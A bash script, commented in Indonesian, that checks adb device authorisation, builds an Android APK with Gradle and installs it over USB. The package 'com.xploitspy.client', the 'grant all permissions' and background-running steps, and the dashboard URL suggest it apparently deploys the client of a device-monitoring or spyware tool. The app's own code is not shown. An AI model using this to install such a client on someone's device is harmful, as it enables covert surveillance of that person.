#!/bin/bash

# Script untuk Fix Device Authorization dan Install APK

echo "========================================="
echo "   Fix Device & Install APK"
echo "========================================="
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Step 1: Check device status
echo "📱 Checking device status..."
DEVICE_STATUS=$(adb devices | grep -v "List" | grep -v "daemon" | awk '{print $2}' | head -1)

if [ -z "$DEVICE_STATUS" ]; then
    echo -e "${RED}❌ No device connected!${NC}"
    echo ""
    echo "Please:"
    echo "1. Connect Android device via USB"
    echo "2. Enable USB Debugging"
    exit 1
fi

echo "   Device status: $DEVICE_STATUS"

if [ "$DEVICE_STATUS" = "unauthorized" ]; then
    echo ""
    echo -e "${YELLOW}⚠️  Device is unauthorized!${NC}"
    echo ""
    echo "Please do the following on your Android device:"
    echo "1. Check your Android device screen"
    echo "2. Look for 'Allow USB debugging?' dialog"
    echo "3. Check 'Always allow from this computer'"
    echo "4. Tap 'Allow' or 'OK'"
    echo ""
    read -p "Press Enter after you've authorized the device..."
    
    # Check again
    DEVICE_STATUS=$(adb devices | grep -v "List" | grep -v "daemon" | awk '{print $2}' | head -1)
    if [ "$DEVICE_STATUS" != "device" ]; then
        echo -e "${RED}❌ Device still not authorized!${NC}"
        echo "Please try again or check USB debugging settings"
        exit 1
    fi
fi

if [ "$DEVICE_STATUS" = "device" ]; then
    echo -e "${GREEN}✅ Device authorized!${NC}"
else
    echo -e "${YELLOW}⚠️  Device status: $DEVICE_STATUS${NC}"
fi

# Step 2: Check if APK exists
echo ""
echo "📦 Checking for APK..."
APK_PATH="client/app/build/outputs/apk/release/app-release.apk"

if [ ! -f "$APK_PATH" ]; then
    echo -e "${YELLOW}⚠️  APK not found. Building APK...${NC}"
    echo ""
    
    cd client
    
    # Check if gradlew exists
    if [ ! -f "gradlew" ]; then
        echo -e "${RED}❌ Gradle wrapper not found!${NC}"
        echo "Please run: ./BUILD_AND_INSTALL_APK.sh first"
        exit 1
    fi
    
    chmod +x gradlew
    
    # Build APK
    echo "🔨 Building APK (this may take a few minutes)..."
    ./gradlew assembleRelease
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}❌ Build failed!${NC}"
        exit 1
    fi
    
    cd ..
    
    if [ ! -f "$APK_PATH" ]; then
        echo -e "${RED}❌ APK still not found after build!${NC}"
        exit 1
    fi
fi

APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
echo -e "${GREEN}✅ APK found!${NC}"
echo "   Location: $APK_PATH"
echo "   Size: $APK_SIZE"

# Step 3: Install APK
echo ""
echo "📲 Installing APK to device..."
adb install -r "$APK_PATH"

if [ $? -eq 0 ]; then
    echo ""
    echo -e "${GREEN}✅ APK installed successfully!${NC}"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "   ✅ Installation Complete!"
    echo ""
    echo "   Next steps:"
    echo "   1. Open the app on your Android device"
    echo "   2. Grant all permissions when asked"
    echo "   3. App will run in background"
    echo "   4. Check dashboard: http://10.254.103.119:3000"
    echo "   5. Device should appear in dashboard"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
else
    echo ""
    echo -e "${RED}❌ Installation failed!${NC}"
    echo ""
    echo "Try:"
    echo "1. Uninstall old version: adb uninstall com.xploitspy.client"
    echo "2. Install again: adb install -r $APK_PATH"
fi

echo ""

